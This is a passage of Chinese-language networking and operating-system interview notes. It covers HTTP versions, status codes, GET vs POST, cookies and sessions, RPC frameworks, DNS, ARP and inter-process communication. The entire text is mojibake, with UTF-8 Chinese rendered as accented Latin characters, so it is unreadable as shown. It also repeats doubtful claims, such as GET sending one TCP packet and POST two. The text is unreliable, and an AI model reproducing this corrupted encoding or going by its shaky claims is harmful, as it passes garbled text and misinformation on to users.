è¯·æ±‚ã€‚è¦æ˜¯ å‰é¢çš„å›åº”ç‰¹åˆ«æ…¢ï¼Œåé¢å°±ä¼šæœ‰è®¸å¤šè¯·æ±‚æ’é˜Ÿç­‰ç€ã€‚è¿™ç§°ä¸ºã€Œé˜Ÿå¤´å µå¡ã€ã€‚\n- **çŠ¶æ€å“åº”ç ** : HTTP/1.1ä¸­æ–°åŠ å…¥äº†å¤§é‡çš„çŠ¶æ€ç ï¼Œå…‰æ˜¯é”™è¯¯å“åº”çŠ¶æ€ç å°±æ–°å¢äº†24ç§ã€‚ä¾‹å¦‚ï¼š\n  - `100 (Continue)`â€”â€”åœ¨è¯·æ±‚å¤§èµ„æºå‰çš„é¢„çƒ­è¯·æ±‚ï¼Œ\n  - `206 (Partial Content)`â€”â€”èŒƒå›´è¯·æ±‚çš„æ ‡è¯†ç ï¼Œ\n  - `409 (Conflict)`â€”â€”è¯·æ±‚ä¸å½“å‰èµ„æºçš„è§„å®šå†²çªï¼Œ\n  - `410 (Gone)`â€”â€”èµ„æºå·²è¢«æ°¸ä¹…è½¬ç§»ï¼Œè€Œä¸”æ²¡æœ‰ä»»ä½•å·²çŸ¥çš„è½¬å‘åœ°å€ã€‚\n\n#### â“·HTTP 2.0â€”â€”2015\n\n> http2.0æ˜¯ä¸€ç§å®‰å…¨é«˜æ•ˆçš„ä¸‹ä¸€ä»£httpä¼ è¾“åè®®ã€‚å®‰å…¨æ˜¯å› ä¸ºhttp2.0å»ºç«‹åœ¨httpsåè®®çš„åŸºç¡€ä¸Šï¼Œé«˜æ•ˆæ˜¯å› ä¸ºå®ƒæ˜¯é€šè¿‡äºŒè¿›åˆ¶åˆ†å¸§æ¥è¿›è¡Œæ•°æ®ä¼ è¾“ã€‚æ­£å› ä¸ºè¿™äº›ç‰¹æ€§ï¼Œhttp2.0åè®®ä¹Ÿåœ¨è¢«è¶Šæ¥è¶Šå¤šçš„ç½‘ç«™æ”¯æŒã€‚\n\n- **äºŒè¿›åˆ¶åˆ†å¸§ï¼š**HTTP2.0é€šè¿‡åœ¨åº”ç”¨å±‚å’Œä¼ è¾“å±‚ä¹‹é—´å¢åŠ ä¸€ä¸ªäºŒè¿›åˆ¶åˆ†å±‚å¸§ï¼Œçªç ´äº†HTTP1.1çš„æ€§èƒ½é™åˆ¶ï¼Œæ”¹è¿›ä¼ è¾“æ€§èƒ½ã€‚\n\n- **å¤šè·¯å¤ç”¨**ï¼šä½¿ç”¨å¤šä¸ªstreamï¼Œæ¯ä¸ªstreamåˆåˆ†å¸§ä¼ è¾“ï¼Œä½¿å¾—ä¸€ä¸ªtcpè¿æ¥èƒ½å¤Ÿå¤„ç†å¤šä¸ªhttpè¯·æ±‚\n\n- **å¤´éƒ¨å‹ç¼©**ï¼šé€šè®¯åŒæ–¹å„è‡ªç»´æŠ¤ä¸€ä¸ªheaderçš„ç´¢å¼•è¡¨ï¼Œä½¿å¾—ä¸éœ€è¦ç›´æ¥å‘é€å€¼ï¼Œé€šè¿‡å‘é€keyç¼©å‡å¤´éƒ¨å¤§å°\n\n- **æœåŠ¡å™¨æ¨é€**ï¼šæœåŠ¡å™¨é™¤äº†æœ€åˆè¯·æ±‚çš„å“åº”å¤–ï¼ŒæœåŠ¡å™¨è¿˜å¯é¢å¤–å‘å®¢æˆ·ç«¯æ¨é€èµ„æºï¼Œè€Œæ— éœ€å®¢æˆ·ç«¯æ˜ç¡®çš„éœ€æ±‚\n\nå‚è€ƒï¼š[æ·±å…¥ç†è§£http2.0åè®®ï¼Œçœ‹è¿™ç¯‡å°±å¤Ÿäº†ï¼](https://mp.weixin.qq.com/s/a83_NE-ww36FZsy320MQFQ)\n\n#### â“¸HTTP 3.0â€”â€”2022\n\n> åŸºäºGoogleçš„QUICï¼ŒHTTP3 èƒŒåçš„ä¸»è¦æ€æƒ³æ˜¯æ”¾å¼ƒ TCPï¼Œè½¬è€Œä½¿ç”¨åŸºäº UDP çš„ QUIC åè®®ã€‚\n>\n> **ä¸ºä»€ä¹ˆè¦æœ‰HTTP3.0ï¼Ÿ**\n>\n> ä¸ºäº†è§£å†³HTTP/2.0ä¸­TCPé€ æˆçš„é˜Ÿå¤´é˜»å¡é—®é¢˜ï¼ŒHTTP/3.0ç›´æ¥æ”¾å¼ƒä½¿ç”¨TCPï¼Œå°†ä¼ è¾“å±‚åè®®æ”¹æˆUDPï¼›ä½†æ˜¯å› ä¸ºUDPæ˜¯ä¸å¯é ä¼ è¾“ï¼Œæ‰€ä»¥è¿™å°±éœ€è¦QUICå®ç°å¯é æœºåˆ¶\n\n- **ä½¿ç”¨åŸºäºUDPçš„QUIC åè®®**ï¼šå‡å°‘äº†tcpä¸‰æ¬¡æ¡æ‰‹æ—¶é—´ï¼Œä»¥åŠtlsæ¡æ‰‹æ—¶é—´ï¼›\n\n- **è§£å†³å¤šè·¯å¤ç”¨ä¸¢åŒ…çš„é˜Ÿå¤´é˜»å¡é—®é¢˜**ï¼šè§£å†³äº†http 2.0ä¸­å‰ä¸€ä¸ªstreamä¸¢åŒ…å¯¼è‡´åä¸€ä¸ªstreamè¢«é˜»å¡çš„é—®é¢˜ï¼›\n\n- **ä¼˜åŒ–äº†é‡ä¼ ç­–ç•¥**ï¼Œé‡ä¼ åŒ…å’ŒåŸåŒ…çš„ç¼–å·ä¸åŒï¼Œé™ä½åç»­é‡ä¼ è®¡ç®—çš„æ¶ˆè€—ï¼›\n\n- **è¿æ¥è¿ç§»**ï¼Œä¸å†ç”¨tcpå››å…ƒç»„ç¡®å®šä¸€ä¸ªè¿æ¥ï¼Œè€Œæ˜¯ç”¨ä¸€ä¸ª64ä½éšæœºæ•°æ¥ç¡®å®šè¿™ä¸ªè¿æ¥ï¼›\n\n- **æ›´åˆé€‚çš„æµé‡æ§åˆ¶**ï¼šé€šè¿‡æµé‡æ§åˆ¶å¯ä»¥é™åˆ¶å®¢æˆ·ç«¯ä¼ è¾“èµ„æ–™é‡çš„å¤§å°ï¼Œæœ‰äº†æµé‡æ§åˆ¶åï¼Œæ¥æ”¶ç«¯å°±å¯ä»¥åªä¿ç•™ç›¸å¯¹åº”å¤§å°çš„æ¥æ”¶ buffer ,ä¼˜åŒ–è®°å¿†ä½“è¢«å ç”¨çš„ç©ºé—´ã€‚\n\nå‚è€ƒï¼š[HTTP/3 ï¼Œå®ƒæ¥äº†](https://mp.weixin.qq.com/s?__biz=MzI0ODk2NDIyMQ==&mid=2247497865&idx=1&sn=2d1f8a1dfcfb9ccde4f29adbfef8dad2&chksm=e99a0d9bdeed848dfb7ee092a2bb685f02d277584a31c1d6300213306b1561e71888438a201f&token=2007326582&lang=zh_CN#rd)\n\n### âHTTP å¸¸è§çŠ¶æ€ç æ€»ç»“\n\nHTTP çŠ¶æ€ç ç”±ä¸‰ä¸ªåè¿›åˆ¶æ•°å­—ç»„æˆï¼Œç¬¬ä¸€ä¸ªåè¿›åˆ¶æ•°å­—å®šä¹‰äº†çŠ¶æ€ç çš„ç±»å‹ã€‚å“åº”åˆ†ä¸ºäº”ç±»ï¼š\n\n| åˆ†ç±» | åˆ†ç±»æè¿°                                         |\n| :--: | :----------------------------------------------- |\n| 1**  | ä¿¡æ¯å“åº”ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯·æ±‚ï¼Œéœ€è¦è¯·æ±‚è€…ç»§ç»­æ‰§è¡Œæ“ä½œ |\n| 2**  | æˆåŠŸå“åº”ï¼Œæ“ä½œè¢«æˆåŠŸæ¥æ”¶å¹¶å¤„ç†                   |\n| 3**  | é‡å®šå‘ï¼Œéœ€è¦è¿›ä¸€æ­¥çš„æ“ä½œä»¥å®Œæˆè¯·æ±‚               |\n| 4**  | å®¢æˆ·ç«¯é”™è¯¯ï¼Œè¯·æ±‚åŒ…å«è¯­æ³•é”™è¯¯æˆ–æ— æ³•å®Œæˆè¯·æ±‚       |\n| 5**  | æœåŠ¡å™¨é”™è¯¯ï¼ŒæœåŠ¡å™¨åœ¨å¤„ç†è¯·æ±‚çš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯   |\n\n- ç¨‹åºå‘˜æœ€æƒ³çœ‹åˆ°çš„ï¼š200-OKã€‚\n\n- ç¨‹åºå‘˜ä¸æƒ³çœ‹åˆ°çš„ï¼š500-Internal-Server-Errorã€‚\n\n- ç”¨æˆ·ä¸æƒ³çœ‹åˆ°çš„ï¼š401-Unauthorizedã€403-Forbiddenã€408-Request-Time-outã€‚\n\nå‚è€ƒï¼š[HTTP çŠ¶æ€ç  | èœé¸Ÿæ•™ç¨‹ (runoob.com)](https://www.runoob.com/http/http-status-codes.html)\n\n### â»HTTP ä¸­ GET å’Œ POST åŒºåˆ«\n\n- 1.GETè¯·æ±‚å‚æ•°é€šè¿‡URLä¼ é€’ï¼›POSTè¯·æ±‚å‚æ•°é€šè¿‡è¯·æ±‚ä½“ä¼ é€’ã€‚\n- 2.GETè¯·æ±‚äº§ç”Ÿ1ä¸ªTCPæ•°æ®åŒ…ï¼›POSTè¯·æ±‚äº§ç”Ÿ2ä¸ªTCPæ•°æ®åŒ…ã€‚\n  - å¯¹äºGETè¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šæŠŠè¯·æ±‚å¤´å’Œè¯·æ±‚ä½“ä¸€å¹¶å‘é€å‡ºå»\n  - å¯¹äºPOSTè¯·æ±‚ï¼Œæµè§ˆå™¨å…ˆå‘é€è¯·æ±‚å¤´ï¼ŒæœåŠ¡å™¨å“åº”100 continueï¼Œæµè§ˆå™¨å†å‘é€è¯·æ±‚ä½“\n- 3.GETè¯·æ±‚ä¼šè¢«æµè§ˆå™¨ä¸»åŠ¨ç¼“å­˜ï¼›POSTè¯·æ±‚ä¸ä¼šï¼Œéœ€æ‰‹åŠ¨è®¾ç½®ã€‚\n- 4.GETè¯·æ±‚å‚æ•°ä¼šè¢«ä¿ç•™åœ¨æµè§ˆå™¨å†å²è®°å½•ä¸­ï¼›POSTè¯·æ±‚å‚æ•°ä¸ä¼šè¢«ä¿ç•™ã€‚\n\n### â¼URI å’Œ URL çš„åŒºåˆ«\n\n- URIï¼ˆUniform Resource Identifierï¼‰ç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼Œå”¯ä¸€æ ‡è¯†ä¸€ä¸ªèµ„æº\n  - URI åƒæ˜¯èº«ä»½è¯ï¼Œå”¯ä¸€æ ‡è¯†ä¸€ä¸ªäºº\n- URLï¼ˆUniform Resource Locatorï¼‰ç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼Œæä¾›è¯¥èµ„æºå¤šè·¯å¾„ï¼Œæ˜¯ä¸€ç§å…·ä½“çš„URIã€‚\n  - URLåƒæ˜¯ä½å€ï¼Œå¯ä»¥é€šè¿‡URLæ‰¾åˆ°è¿™ä¸ªäºº\n\n### â½cookieå’Œsessionçš„åŒºåˆ«ï¼Ÿ\n\n[Cookie & Session | ç®€è¨€ä¹‹ (jwt1399.top)](https://jwt1399.top/posts/37985.html#toc-heading-9)\n\n- Cookie æ˜¯ä¸€ç§**æœåŠ¡ç«¯äº§ç”Ÿ**ä½†**å­˜å‚¨åœ¨å®¢æˆ·ç«¯**ç”¨äºè®°å½•å®¢æˆ·ç«¯çŠ¶æ€çš„æœºåˆ¶ã€‚\n\n- Session æ˜¯ä¸€ç§**å­˜å‚¨åœ¨æœåŠ¡å™¨ç«¯**ç”¨äºè®°å½•å®¢æˆ·ç«¯çŠ¶æ€çš„æœºåˆ¶ã€‚\n\n- Cookie æœºåˆ¶æ˜¯é€šè¿‡**æ£€æŸ¥å®¢æˆ·èº«ä¸Šçš„â€œé€šè¡Œè¯â€**æ¥ç¡®è®¤å®¢æˆ·èº«ä»½\n- Session æœºåˆ¶æ˜¯é€šè¿‡**æ£€æŸ¥æœåŠ¡å™¨ä¸Šçš„â€œå®¢æˆ·æ˜ç»†è¡¨â€**æ¥ç¡®è®¤å®¢æˆ·èº«ä»½\n\n|   åŒºåˆ«   |    Cookie    |  Session   |\n| :------: | :----------: | :--------: |\n| å­˜å‚¨ä½ç½® |    å®¢æˆ·ç«¯    |   æœåŠ¡ç«¯   |\n| å­˜å‚¨å¤§å° | æœ‰é™åˆ¶ï¼ˆ4kï¼‰ |   æ— é™åˆ¶   |\n| è·¨åŸŸæ”¯æŒ |     æ”¯æŒ     |   ä¸æ”¯æŒ   |\n| å­˜å‚¨ä¿¡æ¯ |    ä¸åŠ å¯†    |    åŠ å¯†    |\n| ç”Ÿå‘½å‘¨æœŸ |   å¯è‡ªå®šä¹‰   | ä¸å¯è‡ªå®šä¹‰ |\n\n### â¾HTTP å¦‚ä½•ä¿å­˜ç”¨æˆ·çŠ¶æ€?\n\nHTTP æ˜¯ä¸€ç§æ— çŠ¶æ€ï¼ˆstatelessï¼‰åè®®ã€‚HTTP åè®®è‡ªèº«ä¸å¯¹è¯·æ±‚å’Œå“åº”ä¹‹é—´çš„é€šä¿¡çŠ¶æ€è¿›è¡Œä¿å­˜ã€‚\n\nSession æœºåˆ¶çš„å­˜åœ¨å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒSession çš„ä¸»è¦ä½œç”¨å°±æ˜¯é€šè¿‡æœåŠ¡ç«¯è®°å½•ç”¨æˆ·çš„çŠ¶æ€ã€‚æœåŠ¡ç«¯ç»™ç‰¹å®šçš„ç”¨æˆ·åˆ›å»ºç‰¹å®šçš„ Session ä¹‹åå°±å¯ä»¥æ ‡è¯†è¿™ä¸ªç”¨æˆ·å¹¶ä¸”è·Ÿè¸ªè¿™ä¸ªç”¨æˆ·äº†ï¼ˆä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šåœ¨ä¸€å®šæ—¶é—´å†…ä¿å­˜è¿™ä¸ª Sessionï¼Œè¿‡äº†æ—¶é—´é™åˆ¶ï¼Œå°±ä¼šé”€æ¯è¿™ä¸ª Sessionï¼‰ã€‚åœ¨æœåŠ¡ç«¯ä¿å­˜ Session çš„æ–¹æ³•å¾ˆå¤šï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯å†…å­˜å’Œæ•°æ®åº“(æ¯”å¦‚æ˜¯ä½¿ç”¨å†…å­˜æ•°æ®åº“ redis ä¿å­˜)ã€‚\n\n**æ—¢ç„¶ Session å­˜æ”¾åœ¨æœåŠ¡å™¨ç«¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•å®ç° Session è·Ÿè¸ªå‘¢ï¼Ÿ**å¤§éƒ¨åˆ†æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½æ˜¯é€šè¿‡åœ¨ Cookie ä¸­é™„åŠ ä¸€ä¸ª Session ID æ¥æ–¹å¼æ¥è·Ÿè¸ªã€‚\n\n**Cookie è¢«ç¦ç”¨æ€ä¹ˆåŠ?**æœ€å¸¸ç”¨çš„å°±æ˜¯åˆ©ç”¨ URL é‡å†™æŠŠ Session ID ç›´æ¥é™„åŠ åœ¨ URL è·¯å¾„çš„åé¢ã€‚\n\n### â¿HTTPå’ŒRPC\n\n|     HTTPï¼ˆHyperText Transfer Protocolï¼Œè¶…æ–‡æœ¬ä¼ è¾“åè®®ï¼‰      |          RPCï¼ˆRemote Procedure Callï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰          |\n| :----------------------------------------------------------: | :----------------------------------------------------------: |\n|                         åŸºäºHTTPåè®®                         |               åŸºäºTCPåè®®ï¼Œä¹Ÿå¯ä»¥åŸºäºHTTPåè®®                |\n|            HTTPæ¥å£ä½¿ç”¨åŸºäºHTTPåè®®çš„URLä¼ å‚è°ƒç”¨             |            å®ç°è°ƒç”¨æœ¬åœ°æ¥å£ä¸€æ ·è°ƒç”¨è¿œç¨‹æœåŠ¡çš„æ¥å£            |\n|              HTTPæ›´è‡ƒè‚¿ï¼Œä½†è·¨å¹³å°ã€è·¨è¯­è¨€æ›´çµæ´»              |                  RPCæ•ˆç‡æ›´å¥½ï¼Œä½†æ˜¯å®ç°æ›´éš¾                   |\n|              éœ€è¦é…ç½®Nginxï¼ŒHAProxyå®ç°è´Ÿè½½å‡è¡¡              |                      è‡ªå¸¦äº†è´Ÿè½½å‡è¡¡ç­–ç•¥                      |\n| HTTPä¸»è¦ç”¨äºå¯¹å¤–çš„å¼‚æ„ç¯å¢ƒï¼Œæµè§ˆå™¨è°ƒç”¨ï¼ŒAPPæ¥å£è°ƒç”¨ï¼Œç¬¬ä¸‰æ–¹æ¥å£è°ƒç”¨ç­‰ç­‰ã€‚ | RPCä¸»è¦ç”¨äºå…¬å¸å†…éƒ¨æœåŠ¡è°ƒç”¨ï¼Œæ€§èƒ½æ¶ˆè€—ä½ï¼Œä¼ è¾“æ•ˆç‡é«˜ï¼ŒæœåŠ¡æ²»ç†æ–¹ä¾¿ã€‚ |\n\n\n\n\n\n\n\n\n\n\n\n#### æµè¡Œçš„RPCæ¡†æ¶\n\n1. `gRPC`ï¼šgRPCæ˜¯Googleå…¬å¸ƒçš„å¼€æºé¡¹ç›®ï¼ŒåŸºäºHTTP2.0åè®®ï¼Œå¹¶æ”¯æŒå¸¸è§çš„ä¼—å¤šç¼–ç¨‹è¯­è¨€ã€‚HTTP 2.0åè®®æ˜¯åŸºäºäºŒè¿›åˆ¶çš„HTTPåè®®çš„å‡çº§ç‰ˆæœ¬ï¼ŒgRPCåº•å±‚ä½¿ç”¨äº†Nettyæ¡†æ¶ã€‚\n2. `Thrift`ï¼šThriftæ˜¯Facebookçš„ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œä¸»è¦æ˜¯ä¸€ä¸ªè·¨è¯­è¨€çš„æœåŠ¡å¼€å‘æ¡†æ¶ã€‚å®ƒæœ‰ä¸€ä¸ªä»£ç ç”Ÿæˆå™¨æ¥å¯¹å®ƒæ‰€å®šä¹‰çš„IDLæ–‡ä»¶è‡ªåŠ¨ç”ŸæˆæœåŠ¡ä»£ç æ¡†æ¶ã€‚Thriftå¯¹äºåº•å±‚çš„RPCé€šè®¯éƒ½æ˜¯é€æ˜çš„ï¼Œç”¨æˆ·åªéœ€è¦å¯¹å…¶è¿›è¡ŒäºŒæ¬¡å¼€å‘å³å¯ï¼Œçœå»äº†ä¸€ç³»åˆ—é‡å¤çš„å‰ç½®åŸºç¡€å¼€å‘å·¥ä½œã€‚\n3. `Dubbo`ï¼šDubboæ˜¯é˜¿é‡Œé›†å›¢å¼€æºçš„ä¸€ä¸ªæä¸ºå‡ºåçš„RPCæ¡†æ¶ï¼Œåœ¨å¾ˆå¤šäº’è”ç½‘å…¬å¸å’Œä¼ä¸šåº”ç”¨ä¸­å¹¿æ³›ä½¿ç”¨ã€‚åè®®å’Œåºåˆ—åŒ–æ¡†æ¶éƒ½å¯ä»¥æ’æ‹”æ˜¯åŠå…¶é²œæ˜çš„ç‰¹è‰²ã€‚\n\n\n\n## â‘£Other\n\n### â¶DNS çš„è§£æè¿‡ç¨‹\n\n1. æµè§ˆå™¨æœç´¢**è‡ªå·±çš„DNSç¼“å­˜**\n2. è‹¥æ²¡æœ‰ï¼Œåˆ™æœç´¢**æ“ä½œç³»ç»Ÿä¸­çš„DNSç¼“å­˜**å’Œ**hostsæ–‡ä»¶**\n\n3. è‹¥æ²¡æœ‰ï¼Œåˆ™æ“ä½œç³»ç»Ÿå°†åŸŸåå‘é€è‡³**æœ¬åœ°åŸŸåæœåŠ¡å™¨**ï¼ŒæŸ¥æ‰¾æˆåŠŸåˆ™è¿”å›ç»“æœï¼Œå¦åˆ™ä¾æ¬¡å‘**æ ¹åŸŸåæœåŠ¡å™¨**ã€**é¡¶çº§åŸŸåæœåŠ¡å™¨**ã€**æƒé™åŸŸåæœåŠ¡å™¨**å‘èµ·æŸ¥è¯¢è¯·æ±‚ï¼Œæœ€ç»ˆè¿”å›IPåœ°å€ç»™æœ¬åœ°åŸŸåæœåŠ¡å™¨\n4. **æœ¬åœ°åŸŸåæœåŠ¡å™¨**å°†å¾—åˆ°çš„IPåœ°å€**ç¼“å­˜èµ·æ¥**å¹¶è¿”å›ç»™**æ“ä½œç³»ç»Ÿ**\n5. **æ“ä½œç³»ç»Ÿ**å°† IP åœ°å€**ç¼“å­˜èµ·æ¥**å¹¶**è¿”å›ç»™æµè§ˆå™¨**\n6. æµè§ˆå™¨å¾—åˆ°åŸŸåå¯¹åº”çš„IPåœ°å€\n\n###  â·ARP åè®®\n\n**åœ°å€è§£æåè®®ï¼ˆAddress Resolution Protocolï¼‰**ï¼Œå®ƒè§£å†³çš„æ˜¯ç½‘ç»œå±‚åœ°å€å’Œé“¾è·¯å±‚åœ°å€ä¹‹é—´çš„è½¬æ¢é—®é¢˜ã€‚å› ä¸ºä¸€ä¸ª IP æ•°æ®æŠ¥åœ¨ç‰©ç†ä¸Šä¼ è¾“çš„è¿‡ç¨‹ä¸­ï¼Œæ€»æ˜¯éœ€è¦çŸ¥é“ä¸‹ä¸€è·³ï¼ˆç‰©ç†ä¸Šçš„ä¸‹ä¸€ä¸ªç›®çš„åœ°ï¼‰è¯¥å»å¾€ä½•å¤„ï¼Œä½† IP åœ°å€å±äºé€»è¾‘åœ°å€ï¼Œè€Œ MAC åœ°å€æ‰æ˜¯ç‰©ç†åœ°å€ï¼ŒARP åè®®è§£å†³äº† IP åœ°å€è½¬ MAC åœ°å€çš„ä¸€äº›é—®é¢˜ã€‚\n\n# OS\n\n## â‘ è¿›ç¨‹å’Œçº¿ç¨‹\n\n### â¶è¿›ç¨‹å’Œçº¿ç¨‹çš„åŒºåˆ«\n\n- è¿›ç¨‹æ˜¯æŒ‡ä¸€ä¸ªå†…å­˜ä¸­è¿è¡Œçš„åº”ç”¨ç¨‹åºï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ä¸€å—å†…å­˜ç©ºé—´ã€‚\n- çº¿ç¨‹æ˜¯æ¯”è¿›ç¨‹æ›´å°çš„æ‰§è¡Œå•ä½ï¼Œä¸€ä¸ªè¿›ç¨‹å¯ä»¥å¯åŠ¨å¤šä¸ªçº¿ç¨‹ï¼Œæ¯æ¡çº¿ç¨‹å¹¶è¡Œæ‰§è¡Œä¸åŒçš„ä»»åŠ¡ã€‚\n\n- è°ƒåº¦ï¼šè¿›ç¨‹æ˜¯èµ„æºç®¡ç†çš„åŸºæœ¬å•ä½ï¼Œçº¿ç¨‹æ˜¯ç¨‹åºæ‰§è¡Œçš„åŸºæœ¬å•ä½ã€‚\n\n- åˆ‡æ¢ï¼šçº¿ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢æ¯”è¿›ç¨‹ä¸Šä¸‹æ–‡åˆ‡æ¢è¦å¿«å¾—å¤šã€‚\n\n- æ‹¥æœ‰èµ„æºï¼šè¿›ç¨‹æ˜¯æ‹¥æœ‰èµ„æºçš„ä¸€ä¸ªç‹¬ç«‹å•ä½ï¼Œçº¿ç¨‹ä¸æ‹¥æœ‰ç³»ç»Ÿèµ„æºï¼Œä½†æ˜¯å¯è®¿é—®éš¶å±äºè¿›ç¨‹çš„èµ„æºã€‚\n\n- ç³»ç»Ÿå¼€é”€ï¼šåˆ›å»ºæˆ–æ’¤é”€è¿›ç¨‹æ—¶ï¼Œç³»ç»Ÿéƒ½è¦ä¸ºä¹‹åˆ†é…æˆ–å›æ”¶ç³»ç»Ÿèµ„æºï¼Œåˆ›å»ºæˆ–æ’¤é”€è¿›ç¨‹çš„å¼€é”€å¤§äºåˆ›å»ºæˆ–æ’¤é”€çº¿ç¨‹æ—¶çš„å¼€é”€ï¼Œè¿›ç¨‹åˆ‡æ¢çš„å¼€é”€ä¹Ÿè¿œå¤§äºçº¿ç¨‹åˆ‡æ¢çš„å¼€é”€ã€‚\n\n### â·è¿›ç¨‹é—´çš„é€šä¿¡æ–¹å¼\n\n1. **ç®¡é“/åŒ¿åç®¡é“(Pipes)** ï¼šç”¨äºå…·æœ‰äº²ç¼˜å…³ç³»çš„çˆ¶å­è¿›ç¨‹é—´æˆ–è€…å…„å¼Ÿè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚\n2. **æœ‰åç®¡é“(Named Pipes)** : åŒ¿åç®¡é“ç”±äºæ²¡æœ‰åå­—ï¼Œåªèƒ½ç”¨äºäº²ç¼˜å…³ç³»çš„è¿›ç¨‹é—´é€šä¿¡ã€‚ä¸ºäº†å…‹æœè¿™ä¸ªç¼ºç‚¹ï¼Œæå‡ºäº†æœ‰åç®¡é“ã€‚æœ‰åç®¡é“ä¸¥æ ¼éµå¾ª**å…ˆè¿›å…ˆå‡º(first in first out)**ã€‚æœ‰åç®¡é“ä»¥ç£ç›˜æ–‡ä»¶çš„æ–¹å¼å­˜åœ¨ï¼Œå¯ä»¥å®ç°æœ¬æœºä»»æ„ä¸¤ä¸ªè¿›ç¨‹é€šä¿¡ã€‚\n3. **ä¿¡å·(Signal)** ï¼šä¿¡å·æ˜¯ä¸€ç§æ¯”è¾ƒå¤æ‚çš„é€šä¿¡æ–¹å¼ï¼Œç”¨äºé€šçŸ¥æ¥æ”¶è¿›ç¨‹æŸä¸ªäº‹ä»¶å·²ç»å‘ç”Ÿï¼›\n4. **æ¶ˆæ¯é˜Ÿåˆ—(Message Queuing)** ï¼šæ¶ˆæ¯é˜Ÿåˆ—æ˜¯æ¶ˆæ¯çš„é“¾è¡¨ï¼Œå…·æœ‰ç‰¹å®šçš„æ ¼å¼ï¼Œå­˜æ”¾åœ¨å†…å­˜ä¸­å¹¶ç”±æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦æ ‡è¯†ã€‚ç®¡é“å’Œæ¶ˆæ¯é˜Ÿåˆ—çš„é€šä¿¡æ•°æ®éƒ½æ˜¯å…ˆè¿›å…ˆå‡ºçš„åŸåˆ™ã€‚ä¸ç®¡é“ï¼ˆæ— åç®¡é“ï¼šåªå­˜åœ¨äºå†…å­˜ä¸­çš„æ–‡ä»¶ï¼›å‘½åç®¡é“ï¼šå­˜åœ¨äºå®é™…çš„ç£ç›˜ä»‹è´¨æˆ–è€…æ–‡ä»¶ç³»ç»Ÿï¼‰ä¸åŒçš„æ˜¯æ¶ˆæ¯é˜Ÿåˆ—å­˜æ”¾åœ¨å†…æ ¸ä¸­ï¼Œåªæœ‰åœ¨å†…æ ¸é‡å¯(å³ï¼Œæ“ä½œç³»ç»Ÿé‡å¯)æˆ–è€…æ˜¾å¼åœ°åˆ é™¤ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æ—¶ï¼Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—æ‰ä¼šè¢«çœŸæ­£çš„åˆ é™¤ã€‚æ¶ˆæ¯é˜Ÿåˆ—å¯ä»¥å®ç°æ¶ˆæ¯çš„éšæœºæŸ¥è¯¢ï¼Œæ¶ˆæ¯ä¸ä¸€å®šè¦ä»¥å…ˆè¿›å…ˆå‡ºçš„æ¬¡åºè¯»å–ï¼Œä¹Ÿå¯ä»¥æŒ‰æ¶ˆæ¯çš„ç±»å‹è¯»å–ã€‚æ¯” FIFO æ›´æœ‰ä¼˜åŠ¿ã€‚**æ¶ˆæ¯é˜Ÿåˆ—å…‹æœäº†ä¿¡å·æ‰¿è½½ä¿¡æ¯é‡å°‘ï¼Œç®¡é“åªèƒ½æ‰¿è½½æ— æ ¼å¼å­—èŠ‚æµä»¥åŠç¼“å†²åŒºå¤§å°å—é™ç­‰ç¼ºç‚¹ã€‚**\n5. **ä¿¡å·é‡(Semaphores)** ï¼šä¿¡å·é‡æ˜¯ä¸€ä¸ªè®¡æ•°å™¨ï¼Œç”¨äºå¤šè¿›ç¨‹å¯¹å…±äº«æ•°æ®çš„è®¿é—®ï¼Œä¿¡å·é‡çš„æ„å›¾åœ¨äºè¿›ç¨‹é—´åŒæ­¥ã€‚è¿™ç§é€šä¿¡æ–¹å¼ä¸»è¦ç”¨äºè§£å†³ä¸åŒæ­¥ç›¸å…³çš„é—®é¢˜å¹¶é¿å…ç«äº‰æ¡ä»¶ã€‚\n6. **å…±äº«å†…å­˜(Shared memory)** ï¼šä½¿å¾—å¤šä¸ªè¿›ç¨‹å¯ä»¥è®¿é—®åŒä¸€å—å†…å­˜ç©ºé—´ï¼Œä¸åŒè¿›ç¨‹å¯ä»¥åŠæ—¶çœ‹åˆ°å¯¹æ–¹è¿›ç¨‹ä¸­å¯¹å…±äº«å†…å­˜ä¸­æ•°æ®çš„æ›´æ–°ã€‚è¿™ç§æ–¹å¼éœ€è¦ä¾é æŸç§åŒæ­¥æ“ä½œï¼Œå¦‚äº’æ–¥é”å’Œä¿¡å·é‡ç­‰ã€‚å¯ä»¥è¯´è¿™æ˜¯æœ€æœ‰ç”¨çš„è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ã€‚\n7. **å¥—æ¥å­—(Sockets)** : æ­¤æ–¹æ³•ä¸»è¦ç”¨äºåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´é€šè¿‡ç½‘ç»œè¿›è¡Œé€šä¿¡ã€‚å¥—æ¥å­—æ˜¯æ”¯æŒ TCP/IP çš„ç½‘ç»œé€šä¿¡çš„åŸºæœ¬æ“ä½œå•å…ƒï¼Œå¯ä»¥çœ‹åšæ˜¯ä¸åŒä¸»æœºä¹‹é—´çš„è¿›ç¨‹è¿›è¡ŒåŒå‘é€šä¿¡çš„ç«¯ç‚¹ï¼Œç®€å•çš„è¯´å°±æ˜¯é€šä¿¡çš„ä¸¤æ–¹çš„ä¸€ç§çº¦å®šï¼Œç”¨å¥—æ¥å­—ä¸­çš„ç›¸å…³å‡½æ•°æ¥å®Œæˆé€šä¿¡è¿‡ç¨‹ã€‚\n\n### 